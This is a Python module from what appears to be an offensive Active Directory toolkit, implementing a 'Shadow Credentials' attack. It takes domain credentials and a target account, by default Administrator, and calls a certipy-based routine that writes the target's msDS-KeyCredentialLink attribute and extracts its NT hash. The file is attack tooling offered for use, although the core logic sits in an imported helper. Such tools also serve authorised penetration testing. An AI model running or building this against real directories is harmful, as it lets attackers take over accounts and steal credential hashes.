import os

from tool import Tool
from module import BaseModule


class ShadowCreds(BaseModule):
    name = "Shadow Credentials"
    path = "acl/shadowcreds"
    description = "Shadow Credentials attack. Requires GenericAll / GenericWrite."
    info = 'Takeover user and computer accounts by adding "Shadow Credentials" to them by manipulating their msDS-KeyCredentialLink attribute.'

    options = {
        "dc_ip": {
            "default": "",
            "description": "DC IP or host address. If empty, domain will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target_account": {
            "default": "Administrator",
            "description": "Account to attempt to compromise",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _run(self, opts, pane):
        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(pane)
        if not tool.set_auth(from_module=True):
            return

        tool.title("Add shadow credentials to the target and extract NT hash")
        await tool.certipy_shadow(opts.target_account)

    async def run(self):
        if not self.validate_options():
            return

        await self._run(self.opts, self.pane_b)
